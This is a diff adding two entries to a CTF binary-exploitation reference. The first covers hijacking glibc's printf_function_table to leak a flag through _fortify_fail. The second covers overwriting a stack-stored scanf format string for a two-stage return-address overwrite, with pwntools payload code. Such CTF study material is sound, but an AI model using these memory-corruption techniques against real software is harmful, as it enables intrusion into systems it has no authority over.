@@ -10,12 +10,14 @@
 - [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
 - [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
 - [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
-- [argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
+- [argv\[0\] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
 - [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
 - [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
 - [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
 - [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
 - [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
+- [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
+- [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
 
 ---
 
@@ -516,3 +518,93 @@ payload = filler + exploit_suffix
 **Key insight:** `strlen()` cast to `int8_t` produces signed overflow at length 255, collapsing the sanitization window to zero. Any payload content placed at or beyond byte 255 escapes the filter. Always check for integer truncation when a length field is stored in a signed or short type.
 
 **References:** ASIS CTF Finals 2017
+
+---
+
+## printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)
+
+**Pattern:** Exploit glibc's internal printf dispatch tables to turn a buffer overflow into an information leak without needing a format string vulnerability. When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table` instead of the default handlers.
+
+**Mechanism:**
+1. Buffer overflow to create a fake `printf_arginfo_size_function` structure pointing to `_fortify_fail`
+2. Overwrite `__libc_argv` so `_fortify_fail` prints the flag instead of the real `argv[0]`
+3. Set `printf_function_table` to a non-NULL value (triggers alternate dispatch)
+4. Set `printf_arginfo_table` to point to the fake structure
+
+**How the dispatch works:**
+```c
+// Inside glibc's printf implementation:
+if (__printf_function_table != NULL) {
+    // Alternate path: look up handler via printf_arginfo_table
+    int spec_index = format_char;  // e.g., 'd' = 100
+    // Calls printf_arginfo_table[spec_index](...)
+    // → redirected to _fortify_fail
+}
+
+// _fortify_fail prints:
+//   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0]
+// If __libc_argv[0] points to the flag → flag is leaked
+```
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Addresses determined from libc
+printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF
+printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF
+libc_argv = libc_base + LIBC_ARGV_OFF
+fortify_fail = libc_base + FORTIFY_FAIL_OFF
+
+# Step 1: Overflow to overwrite __libc_argv to point to flag location
+# Step 2: Create fake arginfo table entry pointing to _fortify_fail
+# Step 3: Set printf_function_table to non-NULL
+# Step 4: Set printf_arginfo_table to fake table
+
+# Any subsequent printf with a format specifier (e.g., %d, %s)
+# triggers: printf_arginfo_table['d'] → _fortify_fail
+# _fortify_fail reads __libc_argv[0] → prints flag contents
+```
+
+**Key insight:** When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table`. Overwriting both lets you redirect any printf format specifier to an arbitrary function. Combined with `_fortify_fail` (which prints `__libc_argv[0]`), this turns a buffer overflow into an info leak without needing a format string vulnerability.
+
+**When to recognize:** Buffer overflow that can reach glibc globals but no direct format string vulnerability. The target binary calls `printf` with format specifiers after the overflow. Useful when the goal is information exfiltration (flag leak) rather than code execution.
+
+**References:** 34C3 CTF 2017
+
+---
+
+## scanf Format String on Stack Overwrite (TUCTF 2017)
+
+**Pattern:** When `scanf`'s format string (e.g., `"%30s"`) is stored on the stack adjacent to the user input buffer rather than in `.rodata`, the first input can overflow into the format specifier itself, expanding the allowed read size for the next call.
+
+**Two-stage overflow:**
+```python
+from pwn import *
+
+# Stage 1: Overflow the scanf format string on the stack
+# Format "%30s" is stored 0x14 bytes after the input buffer
+# Overwrite it to become "%99s"
+payload0 = b"0" * 0x14 + p32(0x73393925)  # 0x73393925 = "%99s" in little-endian
+io.sendline(payload0)
+
+# Stage 2: scanf now reads up to 99 bytes instead of 30
+# Use the expanded buffer to reach and overwrite the return address
+payload1 = b"0" * 0x31 + p32(win_addr)     # 0x31 bytes padding + return address
+io.sendline(payload1)
+```
+
+**Stack layout:**
+```text
++0x00: input_buffer[30]    ← scanf reads here
++0x14: format_string[4]    ← "%30s" (overwritten to "%99s")
+  ...
++0x31: saved_ebp
++0x35: return_address       ← target for stage 2
+```
+
+**Key insight:** If the format specifier for `scanf` is on the stack (not in `.rodata`), the first input can overwrite it to expand the read size, then the second input uses the expanded format to reach the return address. Two-stage overflow: first expand the format string, then exploit the expanded buffer. Check whether format strings are stack-allocated by examining the disassembly — `lea` from `rbp`/`rsp` offset (stack) vs. `lea` from `rip`-relative address (`.rodata`).
+
+**When to recognize:** Binary uses `scanf` with a format string that limits input length (e.g., `%30s`), but the overflow is just short of reaching the return address. If the format string is a local variable on the stack rather than a string literal, this two-stage technique bridges the gap.
+
+**References:** TUCTF 2017
